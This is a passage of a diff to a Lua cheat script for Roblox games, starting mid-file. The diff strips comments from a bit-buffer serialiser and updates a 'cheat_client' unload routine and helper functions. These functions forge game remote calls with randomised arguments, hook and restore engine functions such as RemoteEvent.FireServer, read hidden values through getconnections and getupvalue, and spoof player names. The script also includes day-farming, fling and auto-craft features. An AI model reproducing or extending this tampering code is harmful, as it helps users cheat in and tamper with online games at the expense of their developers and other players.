                 function this:SetDebug(state)
                     mDebug = state
                 end
     
-                -- Read / Write to a string
                 function this:FromString(str)
                     this:Reset()
                     for i = 1, #str do
@@ -923,7 +1082,6 @@ if game.PlaceId == 100010170789226 then
                     return table.concat(chars)
                 end
     
-                -- Read / Write to base64
                 function this:FromBase64(str)
                     this:Reset()
                     for i = 1, #str do
@@ -954,7 +1112,6 @@ if game.PlaceId == 100010170789226 then
                     return table.concat(strtab)
                 end	
     
-                -- Dump
                 function this:Dump()
                     local str = ""
                     local str2 = ""
@@ -963,7 +1120,6 @@ if game.PlaceId == 100010170789226 then
                     for i = 1, math.ceil((#mBitBuffer) / 8)*8 do
                         str2 = str2..(mBitBuffer[i] or 0)
                         accum = accum + PowerOfTwo[pow]*(mBitBuffer[i] or 0)
-                        --print(pow..": +"..PowerOfTwo[pow].."*["..(mBitBuffer[i] or 0).."] -> "..accum)
                         pow = pow + 1
                         if pow >= 8 then
                             str2 = str2.." "
@@ -974,7 +1130,6 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
     
-                -- Read / Write a bit
                 local function writeBit(v)
                     mBitPtr = mBitPtr + 1
                     mBitBuffer[mBitPtr] = v
@@ -984,7 +1139,6 @@ if game.PlaceId == 100010170789226 then
                     return mBitBuffer[mBitPtr]
                 end
     
-                -- Read / Write an unsigned number
                 function this:WriteUnsigned(w, value, printoff)
                     assert(w, "Bad arguments to BitBuffer::WriteUnsigned (Missing BitWidth)")
                     assert(value, "Bad arguments to BitBuffer::WriteUnsigned (Missing Value)")
@@ -993,7 +1147,6 @@ if game.PlaceId == 100010170789226 then
                     if mDebug and not printoff then
                         warn("WriteUnsigned["..w.."]:", value)
                     end
-                    -- Store LSB first
                     for i = 1, w do
                         writeBit(value % 2)
                         value = math.floor(value / 2)
@@ -1008,24 +1161,19 @@ if game.PlaceId == 100010170789226 then
                     return value
                 end
     
-                -- Read / Write a signed number
                 function this:WriteSigned(w, value)
                     assert(w and value, "Bad arguments to BitBuffer::WriteSigned (Did you forget a bitWidth?)")
                     assert(math.floor(value) == value, "Non-integer value to BitBuffer::WriteSigned")
-                    -- Write sign
                     if value < 0 then
                         writeBit(1)
                         value = -value
                     else
                         writeBit(0)
                     end
-                    -- Write value
                     this:WriteUnsigned(w-1, value, true)
                 end
                 function this:ReadSigned(w)
-                    -- Read sign
                     local sign = (-1)^readBit()
-                    -- Read value
                     local value = this:ReadUnsigned(w-1, true)
                     if mDebug then
                         warn("ReadSigned["..w.."]:", sign*value)
@@ -1033,9 +1181,7 @@ if game.PlaceId == 100010170789226 then
                     return sign*value
                 end
     
-                -- Read / Write a string. May contain embedded nulls (string.char(0))
                 function this:WriteString(s)
-                    -- First check if it's a 7 or 8 bit width of string
                     local bitWidth = 7
                     for i = 1, #s do
                         if s:sub(i, i):byte() > 127 then
@@ -1044,15 +1190,12 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
     
-                    -- Write the bit width flag
                     if bitWidth == 7 then
                         this:WriteBool(false)
                     else
-                        this:WriteBool(true) -- wide chars
+                        this:WriteBool(true)
                     end
     
-                    -- Now write out the string, terminated with "0x10, 0b0"
-                    -- 0x10 is encoded as "0x10, 0b1"
                     for i = 1, #s do
                         local ch = s:sub(i, i):byte()
                         if ch == 0x10 then
@@ -1063,12 +1206,10 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
     
-                    -- Write terminator
                     this:WriteUnsigned(bitWidth, 0x10)
                     this:WriteBool(false)
                 end
                 function this:ReadString()
-                    -- Get bit width
                     local bitWidth;
                     if this:ReadBool() then
                         bitWidth = 8
@@ -1076,7 +1217,6 @@ if game.PlaceId == 100010170789226 then
                         bitWidth = 7
                     end
     
-                    -- Loop
                     local str = ""
                     while true do
                         local ch = this:ReadUnsigned(bitWidth)
@@ -1094,7 +1234,6 @@ if game.PlaceId == 100010170789226 then
                     return str
                 end
     
-                -- Read / Write a bool
                 function this:WriteBool(v)
                     if v then
                         this:WriteUnsigned(1, 1, true)
@@ -1107,19 +1246,15 @@ if game.PlaceId == 100010170789226 then
                     return v
                 end
     
-                -- Read / Write a floating point number with |wfrac| fraction part
-                -- bits, |wexp| exponent part bits, and one sign bit.
                 function this:WriteFloat(wfrac, wexp, f)
                     assert(wfrac and wexp and f)
     
-                    -- Sign
                     local sign = 1
                     if f < 0 then
                         f = -f
                         sign = -1
                     end
     
-                    -- Decompose
                     local mantissa, exponent = math.frexp(f)
                     if exponent == 0 and mantissa == 0 then
                         this:WriteUnsigned(wfrac + wexp + 1, 0)
@@ -1128,18 +1263,15 @@ if game.PlaceId == 100010170789226 then
                         mantissa = ((mantissa - 0.5)/0.5 * PowerOfTwo[wfrac])
                     end
     
-                    -- Write sign
                     if sign == -1 then
                         this:WriteBool(true)
                     else
                         this:WriteBool(false)
                     end
     
-                    -- Write mantissa
-                    mantissa = math.floor(mantissa + 0.5) -- Not really correct, should round up/down based on the parity of |wexp|
+                    mantissa = math.floor(mantissa + 0.5)
                     this:WriteUnsigned(wfrac, mantissa)
     
-                    -- Write exponent
                     local maxExp = PowerOfTwo[wexp-1]-1
                     if exponent > maxExp then
                         exponent = maxExp
@@ -1152,29 +1284,23 @@ if game.PlaceId == 100010170789226 then
                 function this:ReadFloat(wfrac, wexp)
                     assert(wfrac and wexp)
     
-                    -- Read sign
                     local sign = 1
                     if this:ReadBool() then
                         sign = -1
                     end
     
-                    -- Read mantissa
                     local mantissa = this:ReadUnsigned(wfrac)
     
-                    -- Read exponent
                     local exponent = this:ReadSigned(wexp)
                     if exponent == 0 and mantissa == 0 then
                         return 0
                     end
     
-                    -- Convert mantissa
                     mantissa = mantissa / PowerOfTwo[wfrac] * 0.5 + 0.5
     
-                    -- Output
                     return sign * math.ldexp(mantissa, exponent)
                 end
     
-                -- Read / Write single precision floating point
                 function this:WriteFloat32(f)
                     this:WriteFloat(23, 8, f)
                 end
@@ -1182,7 +1308,6 @@ if game.PlaceId == 100010170789226 then
                     return this:ReadFloat(23, 8)
                 end
     
-                -- Read / Write double precision floating point
                 function this:WriteFloat64(f)
                     this:WriteFloat(52, 11, f)
                 end
@@ -1190,7 +1315,6 @@ if game.PlaceId == 100010170789226 then
                     return this:ReadFloat(52, 11)
                 end
     
-                -- Read / Write a BrickColor
                 function this:WriteBrickColor(b)
                     local pnum = BrickColorToNumber[b.Number]
                     if not pnum then
@@ -1203,7 +1327,6 @@ if game.PlaceId == 100010170789226 then
                     return NumberToBrickColor[this:ReadUnsigned(6)]
                 end
     
-                -- Read / Write a rotation as a 64bit value.
                 local function round(n)
                     return math.floor(n + 0.5)
                 end
@@ -1215,11 +1338,9 @@ if game.PlaceId == 100010170789226 then
                     local withoutRoll = CFrame.new(cf.p) * CFrame.Angles(0, azumith, 0) * CFrame.Angles(elevation, 0, 0)
                     local x, y, z = (withoutRoll:inverse()*cf):toEulerAnglesXYZ()
                     local roll = z
-                    -- Atan2 -> in the range [-pi, pi] 
                     azumith   = round((azumith   /  math.pi   ) * (2^21-1))
                     roll      = round((roll      /  math.pi   ) * (2^20-1))
                     elevation = round((elevation / (math.pi/2)) * (2^20-1))
-                    --
                     this:WriteSigned(22, azumith)
                     this:WriteSigned(21, roll)
                     this:WriteSigned(21, elevation)
@@ -1228,15 +1349,12 @@ if game.PlaceId == 100010170789226 then
                     local azumith   = this:ReadSigned(22)
                     local roll      = this:ReadSigned(21)
                     local elevation = this:ReadSigned(21)
-                    --
                     azumith =    math.pi    * (azumith / (2^21-1))
                     roll =       math.pi    * (roll    / (2^20-1))
                     elevation = (math.pi/2) * (elevation / (2^20-1))
-                    --
                     local rot = CFrame.Angles(0, azumith, 0)
                     rot = rot * CFrame.Angles(elevation, 0, 0)
                     rot = rot * CFrame.Angles(0, 0, roll)
-                    --
                     return rot
                 end
     
@@ -1545,19 +1663,15 @@ if game.PlaceId == 100010170789226 then
         shared.crypt = crypt
     end
     
-    -- Utility Functions
     do
         function utility:Create(instanceType, instanceProperties, container)
             local instance = Drawing.new(instanceType)
             local parent
-            --
             if instanceProperties["Parent"] or instanceProperties["parent"] then
                 parent = instanceProperties["Parent"] or instanceProperties["parent"]
-                --
                 instanceProperties["parent"] = nil
                 instanceProperties["Parent"] = nil
             end
-            --
             for property, value in pairs(instanceProperties) do
                 if property and value then
                     if property == "Size" or property == "Size" then
@@ -1566,25 +1680,21 @@ if game.PlaceId == 100010170789226 then
                         else
                             local xSize = (value.X.Scale * ((parent and parent.Size) or ws.CurrentCamera.ViewportSize).X) + value.X.Offset
                             local ySize = (value.Y.Scale * ((parent and parent.Size) or ws.CurrentCamera.ViewportSize).Y) + value.Y.Offset
-                            --
                             instance.Size = Vector2.new(xSize, ySize)
                         end
                     elseif property == "Position" or property == "position" then
                         if instanceType == "Text" then
                             local xPosition = ((((parent and parent.Position) or Vector2.new(0, 0)).X) + (value.X.Scale * ((typeof(parent.Size) == "number" and parent.TextBounds) or parent.Size).X)) + value.X.Offset
                             local yPosition = ((((parent and parent.Position) or Vector2.new(0, 0)).Y) + (value.Y.Scale * ((typeof(parent.Size) == "number" and parent.TextBounds) or parent.Size).Y)) + value.Y.Offset
-                            --
                             instance.Position = Vector2.new(xPosition, yPosition)
                         else
                             local xPosition = ((((parent and parent.Position) or Vector2.new(0, 0)).X) + value.X.Scale * ((parent and parent.Size) or ws.CurrentCamera.ViewportSize).X) + value.X.Offset
                             local yPosition = ((((parent and parent.Position) or Vector2.new(0, 0)).Y) + value.Y.Scale * ((parent and parent.Size) or ws.CurrentCamera.ViewportSize).Y) + value.Y.Offset
-                            --
                             instance.Position = Vector2.new(xPosition, yPosition)
                         end
                     elseif property == "Color" or property == "color" then
                         if typeof(value) == "string" then
                             instance["Color"] = shared.theme[value]
-                            --
                             if value == "accent" then
                                 shared.accents[#shared.accents + 1] = instance
                             end
@@ -1596,9 +1706,7 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
             end
-            --
             shared.drawing_containers[container][#shared.drawing_containers[container] + 1] = instance
-            --
             return instance
         end
     
@@ -1606,17 +1714,14 @@ if game.PlaceId == 100010170789226 then
             if instanceProperty == "Size" or instanceProperty == "Size" then
                 local xSize = (instanceValue.X.Scale * ((instanceParent and instanceParent.Size) or ws.CurrentCamera.ViewportSize).X) + instanceValue.X.Offset
                 local ySize = (instanceValue.Y.Scale * ((instanceParent and instanceParent.Size) or ws.CurrentCamera.ViewportSize).Y) + instanceValue.Y.Offset
-                --
                 instance.Size = Vector2.new(xSize, ySize)
             elseif instanceProperty == "Position" or instanceProperty == "position" then
                     local xPosition = ((((instanceParent and instanceParent.Position) or Vector2.new(0, 0)).X) + (instanceValue.X.Scale * ((typeof(instanceParent.Size) == "number" and instanceParent.TextBounds) or instanceParent.Size).X)) + instanceValue.X.Offset
                     local yPosition = ((((instanceParent and instanceParent.Position) or Vector2.new(0, 0)).Y) + (instanceValue.Y.Scale * ((typeof(instanceParent.Size) == "number" and instanceParent.TextBounds) or instanceParent.Size).Y)) + instanceValue.Y.Offset
-                    --
                     instance.Position = Vector2.new(xPosition, yPosition)
             elseif instanceProperty == "Color" or instanceProperty == "color" then
                 if typeof(instanceValue) == "string" then
                     instance.Color = shared.theme[instanceValue]
-                    --
                     if instanceValue == "accent" then
                         shared.accents[#shared.accents + 1] = instance
                     else
@@ -1630,48 +1735,72 @@ if game.PlaceId == 100010170789226 then
             end
         end
     
-        function utility:Connection(connectionType, connectionCallback)
+        function utility:Connection(connectionType, connectionCallback, skip_tracking)
             local connection = connectionType:Connect(connectionCallback)
-            if shared.connections then
+            if shared.connections and not skip_tracking then
                 shared.connections[#shared.connections + 1] = connection
             end
-            --
             return connection
         end
     
         function utility:RemoveConnection(connection)
             if not shared then return end
-            if not shared.connections then return end
-            for index, con in pairs(shared.connections) do
-                if con == connection then
-                    con:Disconnect()
-                    shared.connections[index] = nil
+
+            if shared.connections then
+                for index = #shared.connections, 1, -1 do
+                    local con = shared.connections[index]
+                    if con == connection then
+                        con:Disconnect()
+                        table.remove(shared.connections, index)
+                        break
+                    end
                 end
             end
-            --
-            for index, con in pairs(shared.hidden_connections) do
-                if con == connection then
-                    con:Disconnect()
-                    shared.hidden_connections[index] = nil
+
+            if shared.hidden_connections then
+                for index = #shared.hidden_connections, 1, -1 do
+                    local con = shared.hidden_connections[index]
+                    if con == connection then
+                        con:Disconnect()
+                        table.remove(shared.hidden_connections, index)
+                        break
+                    end
                 end
             end
         end
-    
+
+        function utility:CompactConnections()
+            if not shared or not shared.connections then return end
+
+            for index = #shared.connections, 1, -1 do
+                local con = shared.connections[index]
+                if not con or not con.Connected then
+                    table.remove(shared.connections, index)
+                end
+            end
+
+            if shared.hidden_connections then
+                for index = #shared.hidden_connections, 1, -1 do
+                    local con = shared.hidden_connections[index]
+                    if not con or not con.Connected then
+                        table.remove(shared.hidden_connections, index)
+                    end
+                end
+            end
+        end
+
         function utility:Lerp(instance, instanceTo, instanceTime)
             local currentTime = 0
             local currentIndex = {}
             local connection
-            --
             for i,v in pairs(instanceTo) do
                 currentIndex[i] = instance[i]
             end
-            --
             local function lerp()
                 for i,v in pairs(instanceTo) do
                     instance[i] = ((v - currentIndex[i]) * currentTime / instanceTime) + currentIndex[i]
                 end
             end
-            --
             connection = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function(delta)
                 if currentTime < instanceTime then
                     currentTime = currentTime + delta
@@ -1689,7 +1818,20 @@ if game.PlaceId == 100010170789226 then
 
             task.wait(0.5)
 
+            pcall(function() utility:CompactConnections() end)
+
             local success, err = pcall(function()
+                if teleport_init_failed_connection then
+                    pcall(function() teleport_init_failed_connection:Disconnect() end)
+                    teleport_init_failed_connection = nil
+                end
+
+                if shared and shared.on_teleport_connection then
+                    pcall(function() shared.on_teleport_connection:Disconnect() end)
+                    shared.on_teleport_connection = nil
+                    shared.on_teleport_setup = false
+                end
+
                 if shared and shared.connections then
                     for i,v in pairs(shared.connections) do
                         if v and v.Disconnect then
@@ -1697,50 +1839,74 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
                 end
-                --
                 if shared and shared.drawing_containers then
                     for i,v in pairs(shared.drawing_containers) do
                         for _,k in pairs(v) do
                             k:Remove()
                         end
                     end
-                    --
                     table.clear(shared.drawing_containers)
                 end
-                --
                 if shared then
                     shared.drawing_containers = nil
                     shared.connections = nil
                 end
-                --
                 cas:UnbindAction("BlockAutoParryInputs")
                 cas:UnbindAction("BlockAutoParryMouse")
                 cas:UnbindAction("BlockMouse")
                 cas:UnbindAction("FreecamKeyboard")
-                --
                 if cheat_client and cheat_client.chat_logger_instance then
                     cheat_client.chat_logger_instance:Unload()
                     cheat_client.chat_logger_instance = nil
                 end
-                --
+                if cheat_client and cheat_client.macro_system then
+                    cheat_client.macro_system.stopping = true
+
+                    if cheat_client.macro_system.macro_connections then
+                        for name, conn in pairs(cheat_client.macro_system.macro_connections) do
+                            if conn then
+                                pcall(function() conn:Disconnect() end)
+                            end
+                        end
+                    end
+
+                    if cheat_client.macro_system.keybind_connections then
+                        for name, conns in pairs(cheat_client.macro_system.keybind_connections) do
+                            if conns then
+                                for _, conn in ipairs(conns) do
+                                    if conn then
+                                        pcall(function() conn:Disconnect() end)
+                                    end
+                                end
+                            end
+                        end
+                        table.clear(cheat_client.macro_system.keybind_connections)
+                    end
+
+                    if cheat_client.macro_system.is_running then
+                        table.clear(cheat_client.macro_system.is_running)
+                    end
+
+                    if cheat_client.macro_system.loaded_macros then
+                        table.clear(cheat_client.macro_system.loaded_macros)
+                    end
+
+                    if cheat_client.macro_system.macro_connections then
+                        table.clear(cheat_client.macro_system.macro_connections)
+                    end
+
+                    cheat_client.macro_system = nil
+                end
                 if cheat_client and cheat_client.apply_streamer then
                     pcall(function()
                         cheat_client:apply_streamer(false)
                     end)
                 end
-                --
                 if cheat_client and cheat_client.stop_fling then
                     pcall(function()
                         cheat_client.stop_fling()
                     end)
                 end
-                --
-                if cheat_client and cheat_client.stop_silent_aim_rendering then
-                    pcall(function()
-                        cheat_client.stop_silent_aim_rendering()
-                    end)
-                end
-                --
                 if plr and plr.Character then
                     pcall(function()
                         if cheat_client and cheat_client.char_custom_restore then
@@ -1748,15 +1914,12 @@ if game.PlaceId == 100010170789226 then
                         end
                     end)
                 end
-                --
                 if shared and shared.library and shared.library.Unload then
                     pcall(function() shared.library:Unload() end)
                 end
-                --
                 if shared and shared.SPRLS then
                     shared.SPRLS = nil
                 end
-                --
                 if shared and shared.SPROC then
                     LPH_NO_VIRTUALIZE(function()
                         for v, data in pairs(shared.SPROC) do
@@ -1769,14 +1932,12 @@ if game.PlaceId == 100010170789226 then
                     end)()
                     shared.SPROC = nil
                 end
-                --
                 if shared then
                     table.clear(shared)
                 end
                 utility = nil
                 library = nil
                 shared = nil
-                --
                 do
                     if plr.Character and plr.Backpack and FindFirstChild(plr.Backpack, "HealerVision") then return end
                     for _,v in pairs(workspace.Live:GetChildren()) do
@@ -1793,12 +1954,59 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
                 end
-                --
                 if original_names[plr] then
                     cheat_client:spoof_name(original_names[plr])
                     original_names[plr] = nil
                 end
-                --
+                if original_days.hundred then
+                    local stat_gui = FindFirstChild(plr.PlayerGui, "StatGui")
+                    if stat_gui then
+                        local lives = FindFirstChild(stat_gui.Container.Health, "Lives")
+                        if lives then
+                            local rollers = {}
+                            for _, child in ipairs(lives:GetChildren()) do
+                                if child.Name == "Roller" and FindFirstChild(child, "Char") then
+                                    table.insert(rollers, child)
+                                end
+                            end
+
+                            if #rollers >= 4 then
+                                local has_thousand = #rollers >= 6
+
+                                local thousand, hundred, ten, one
+                                if has_thousand then
+                                    thousand = rollers[2]
+                                    hundred = rollers[3]
+                                    ten = rollers[4]
+                                    one = rollers[5]
+                                else
+                                    hundred = rollers[2]
+                                    ten = rollers[3]
+                                    one = rollers[4]
+                                end
+
+                                if thousand and original_days.thousand and original_days.thousand.text then
+                                    thousand.Char.Text = original_days.thousand.text
+                                end
+                                if hundred and original_days.hundred.text then
+                                    hundred.Char.Text = original_days.hundred.text
+                                end
+                                if ten and original_days.ten.text then
+                                    ten.Char.Text = original_days.ten.text
+                                end
+                                if one and original_days.one.text then
+                                    one.Char.Text = original_days.one.text
+                                end
+
+                                if original_days.thousand and original_days.thousand.connection then original_days.thousand.connection:Disconnect() end
+                                if original_days.hundred.connection then original_days.hundred.connection:Disconnect() end
+                                if original_days.ten.connection then original_days.ten.connection:Disconnect() end
+                                if original_days.one.connection then original_days.one.connection:Disconnect() end
+                            end
+                        end
+                    end
+                    original_days = {}
+                end
                 if plr.PlayerGui and FindFirstChild(plr.PlayerGui, "LeaderboardGui") then
                     local scrollingFrame = plr.PlayerGui["LeaderboardGui"].MainFrame.ScrollingFrame
                     for _, frame in pairs(scrollingFrame:GetChildren()) do
@@ -1828,7 +2036,6 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
                 end
-                --
                 task.defer(function()
                     pcall(function()
                         local playerGui = FindFirstChild(plr, "PlayerGui")
@@ -1850,31 +2057,14 @@ if game.PlaceId == 100010170789226 then
                         end
                     end)
                 end)
-                --
-                if plr.PlayerGui and playerLabels then
-                    local leaderboardGui = FindFirstChild(plr.PlayerGui, "LeaderboardGui")
-                    if leaderboardGui and FindFirstChild(leaderboardGui, "MainFrame") then
-                        local scrollingFrame = leaderboardGui.MainFrame.ScrollingFrame
-                        for _, v in pairs(scrollingFrame:GetChildren()) do
-                            if v:IsA("TextLabel") then
-                                local player = playerLabels[v]
-                                if player then
-                                    local hasMaxEdict = player:GetAttribute("MaxEdict") == true
-                                    local hasLeaderstat = is_khei and FindFirstChild(player, "leaderstats") and FindFirstChild(player.leaderstats, "MaxEdict") and player.leaderstats.MaxEdict.Value == true
-
-                                    v.TextColor3 = (hasMaxEdict or hasLeaderstat) and Color3.fromRGB(255, 214, 81) or Color3.new(1, 1, 1)
-                                end
-                            end
-                        end
-                        table.clear(playerLabels)
-                        playerLabels = nil
-                    end
-                end
-                --
-                if game.PlaceId == 100010170789226 then
+                if game.PlaceId == 5208655184 then
                     container = FindFirstChild(ws, "Map")
+                elseif game.PlaceId == 3541987450 then
+                    container = ws
                 end
-                --
+                if game.PlaceId == 5208655184 or game.PlaceId == 14341521240 then
+                    txt.ChatWindowConfiguration.Enabled = false
+                end
                 if container and cheat_client then
                     for _, v in next, container:GetDescendants() do
                         if v:IsA("BasePart") and FindFirstChild(v, "TouchInterest") then
@@ -1886,7 +2076,18 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
                 end
-                --
+                do
+                    local monsters = FindFirstChild(workspace, "MonstersSpawns") or FindFirstChild(workspace, "MonsterSpawns")
+                    if monsters and FindFirstChild(monsters, "Triggers") then
+                        for _, obj in ipairs(monsters.Triggers:GetDescendants()) do
+                            if obj and obj.ClassName == "Part" then
+                                pcall(function()
+                                    obj.CanTouch = true
+                                end)
+                            end
+                        end
+                    end
+                end
                 for _, v in pairs(plrs:GetPlayers()) do
                     local char = v.Character
                     local backpack = FindFirstChild(v, "Backpack")
@@ -1896,24 +2097,31 @@ if game.PlaceId == 100010170789226 then
 
                     if (jack_char and jack_char:IsA("Tool")) or (jack_bag and jack_bag:IsA("Tool")) then
                         v:SetAttribute("Hidden", true)
+
+                        if game.PlaceId == 3541987450 then
+                            local leaderstats = FindFirstChild(v, "leaderstats")
+                            if leaderstats then
+                                local hidden = FindFirstChild(leaderstats, "Hidden")
+                                if hidden and hidden:IsA("BoolValue") then
+                                    hidden.Value = true
+                                end
+                            end
+                        end
                     end
                 end
-                --
-                plr.CameraMaxZoomDistance = 50
-                plr.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
-                --
+                if game.PlaceId ~= 14341521240 then
+                    plr.CameraMaxZoomDistance = 50
+                    plr.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
+                end
                 if old_remote then
                     pcall(hookfunction, Instance.new("RemoteEvent").FireServer, old_remote)
                 end
-                --
                 if old_hastag then
                     pcall(hookfunction, cs.HasTag, old_hastag)
                 end
-                --
                 if old_destroy then
                     pcall(hookfunction, ws.Destroy, old_destroy)
                 end
-                --
                 pcall(function()
                     if plr.Character then
                         ws.CurrentCamera.CameraSubject = plr.Character
@@ -1926,15 +2134,15 @@ if game.PlaceId == 100010170789226 then
                         ws.CurrentCamera.CameraType = Enum.CameraType.Scriptable
                     end
                 end)
-                --
+                auto_craft_active = nil
+                auto_pot_active = nil
                 dialogue_remote = nil
+                mana_remote = nil
                 done = nil
                 busy = nil
-                --
                 if FindFirstChild(plr.PlayerGui, "BardGui") then
                     FindFirstChild(plr.PlayerGui, "BardGui").Enabled = true
                 end
-                --
                 pcall(function()
                     local blindness = FindFirstChild(lit, "Blindness")
                     if blindness then blindness.Enabled = true end
@@ -1945,7 +2153,6 @@ if game.PlaceId == 100010170789226 then
                     local areacolor = FindFirstChild(lit, "areacolor")
                     if areacolor then areacolor.Enabled = true end
                 end)
-                --
                 pcall(function()
                     if cheat_client.restore_ambience then
                         cheat_client:restore_ambience();
@@ -1965,8 +2172,7 @@ if game.PlaceId == 100010170789226 then
                     
                     watched_guis = nil
                 end)
-                --
-                for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+                for _, v in pairs(Services.CoreGui:GetChildren()) do
                     task.defer(function()
                         if FindFirstChild(v, "Toggle") and FindFirstChild(v, 'SaveInstance') then
                             v.Enabled = false
@@ -1976,13 +2182,26 @@ if game.PlaceId == 100010170789226 then
                         end
                     end)
                 end
-                --
                 pcall(function()
                     if hidden_folder and hidden_folder.Parent then
                         hidden_folder:Destroy()
                     end
+
+                    for _,v in pairs(workspace.Thrown:GetChildren()) do
+                        if v.Name == "2holla" then
+                            v:Destroy()
+                        end
+                    end
+
+                    if cheat_client and cheat_client.bag_range_hitbox then
+                        cheat_client.bag_range_hitbox:Destroy()
+                        cheat_client.bag_range_hitbox = nil
+                    end
+                    if cheat_client and cheat_client.bag_range_hitbox_connection then
+                        cheat_client.bag_range_hitbox_connection:Disconnect()
+                        cheat_client.bag_range_hitbox_connection = nil
+                    end
                 end)
-                --
                 if cpu and cpu.status.active then
                     setfpscap(240)
                     cpu.services.ugs.MasterVolume = cpu.services.ms
@@ -2004,6 +2223,19 @@ if game.PlaceId == 100010170789226 then
             end)
 
             pcall(function()
+                mem:RemoveItem("dayfarming")
+                mem:RemoveItem("dayfarming_range")
+                mem:RemoveItem("day_goal_kick")
+                mem:RemoveItem("no_kick")
+                mem:RemoveItem("daygoal")
+
+                if not removeitem then
+                    mem:RemoveItem("botstarted")
+                    mem:RemoveItem("loaded_config")
+                end
+            end)
+
+            pcall(function()
                 if original_materials then
                     for v, data in pairs(original_materials) do
                         if v and v.Parent then
@@ -2017,6 +2249,20 @@ if game.PlaceId == 100010170789226 then
             end)
 
             pcall(function()
+                if mana_overlay then
+                    table.clear(mana_overlay)
+                    mana_overlay = nil
+                end
+            end)
+
+            pcall(function()
+                if transparent_parts then
+                    table.clear(transparent_parts)
+                    transparent_parts = nil
+                end
+            end)
+
+            pcall(function()
                 if cheat_client then
                     table.clear(cheat_client)
                     cheat_client = nil
@@ -2026,7 +2272,6 @@ if game.PlaceId == 100010170789226 then
     
         function utility:ChangeAccent(accentColor)
             shared.theme.accent = accentColor
-            --
             for index, drawing in pairs(shared.accents) do
                 drawing.Color = shared.theme.accent
             end
@@ -2055,37 +2300,53 @@ if game.PlaceId == 100010170789226 then
         end
         
         function utility:LeftClick()
-            local character = plr.Character
-            if not character then return end
+            local args = {
+                math.random(1, 10),
+                tonumber("0." .. math.random(1e15, 9e15))
+            }
 
-            local network = FindFirstChild(character, "Network")
-            if not network then return end
+            local remote = plr.Character 
+                and FindFirstChild(plr.Character, "CharacterHandler") 
+                and plr.Character.CharacterHandler.Remotes.LeftClick
 
-            local args = {}
-
-            pcall(function()
-                network:FireServer("Click", args)
-            end)
+            if remote then
+                pcall(function()
+                    remote:FireServer(args)
+                end)
+            end
         end
 
         function utility:RightClick()
-            local character = plr.Character
-            if not character then return end
-
-            local network = FindFirstChild(character, "Network")
-            if not network then return end
-
             local args = {
-                ["ShiftLocked"] = false
+            	[1] = math.random(1, 10),
+            	[2] = math.random()
             }
-
-            pcall(function()
-                network:FireServer("Click2", args)
-            end)
+            local remote = plr.Character and FindFirstChild(plr.Character, "CharacterHandler") and plr.Character.CharacterHandler.Remotes.RightClick
+            if remote then
+                remote:FireServer(args)
+            end
         end
 
-        do -- Mana stuff
-            local pingValue = game:GetService('Stats'):WaitForChild('PerformanceStats'):WaitForChild('Ping')
+        function utility:getPlayerDays()
+            local cons = getconnections(rps.Requests.DaysSurvivedChanged.OnClientEvent)
+            if not cons or #cons == 0 then
+                return self.day_cache
+            end
+
+            for _, v in next, cons do
+                local ok, value = pcall(getupvalue, v.Function, 2)
+                if ok and typeof(value) == "number" then
+                    self.day_cache = value
+                    return value
+                end
+            end
+
+            return self.day_cache
+        end
+
+
+        do
+            local pingValue = Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping')
             local smoothed_ping = 0
 
             task.spawn(function()
@@ -2121,31 +2382,23 @@ if game.PlaceId == 100010170789226 then
             end
 
             function utility:charge_mana()
-                if not self then return end
+                if not mana_remote or not self then return end
 
-                local character = plr.Character
-                if not character then return end
-
-                local network = FindFirstChild(character, "Network")
-                if not network then return end
-
-                pcall(function()
-                    network:FireServer("Charge")
-                end)
+                if is_gaia then
+                    mana_remote:FireServer({ math.random(1, 10), math.random() })
+                else
+                    mana_remote:FireServer(true)
+                end
             end
 
             function utility:decharge_mana()
-                if not self then return end
+                if not mana_remote or not self then return end
 
-                local character = plr.Character
-                if not character then return end
-
-                local network = FindFirstChild(character, "Network")
-                if not network then return end
-
-                pcall(function()
-                    network:FireServer("StopCharge")
-                end)
+                if is_gaia then
+                    mana_remote:FireServer()
+                else
+                    mana_remote:FireServer(false)
+                end
             end
 
             function utility:charge_mana_until(amount)
@@ -2183,14 +2436,12 @@ if game.PlaceId == 100010170789226 then
         end
 
         function utility:random_wait(usePing)
-            --[[ 
-                print(utility:random_wait())        -- random humanized delay
-                print(utility:random_wait(true))    -- ping-based delay 
-            --]]
+            --    print(utility:random_wait())
+            --    print(utility:random_wait(true))
 
             local function getPing()
                 local success, ping = pcall(function()
-                    return game:GetService('Stats'):WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
+                    return Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
                 end)
                 return success and ping or 0
             end
@@ -2222,7 +2473,6 @@ if game.PlaceId == 100010170789226 then
             else
                 library:Notify("Server hop not supported in this game", 3)
             end
-            --tps:Teleport(3016661674)
         end
 
         function utility:UnblockAll()
@@ -2246,9 +2496,9 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- server finder
+        do
             local ROBLOX_GAMES_API = "https://games.roblox.com/v1/games/%s/servers/0"
-            local httpService = game:GetService("HttpService")
+            local httpService = Services.HttpService
             local SERVER_HISTORY_KEY = "RecentServers_" .. game.PlaceId
             local MAX_HISTORY_SIZE = 15
 
@@ -2375,10 +2625,96 @@ if game.PlaceId == 100010170789226 then
 
                 return nil
             end
+
+            function utility:get_oldest_server()
+                local currentJobId = game.JobId
+                local history = get_server_history()
+                local serverInfo = FindFirstChild(rps, "ServerInfo")
+                local httpService = Services.HttpService
+
+                if not serverInfo then
+                    warn("[!] ServerInfo not found")
+                    return nil
+                end
+
+                local oldestServer = nil
+                local maxLifespan = -1
+
+                for _, serverFolder in ipairs(serverInfo:GetChildren()) do
+                    local jobId = serverFolder.Name
+                    local lifespanValue = FindFirstChild(serverFolder, "Lifespan")
+                    local playersValue = FindFirstChild(serverFolder, "Players")
+
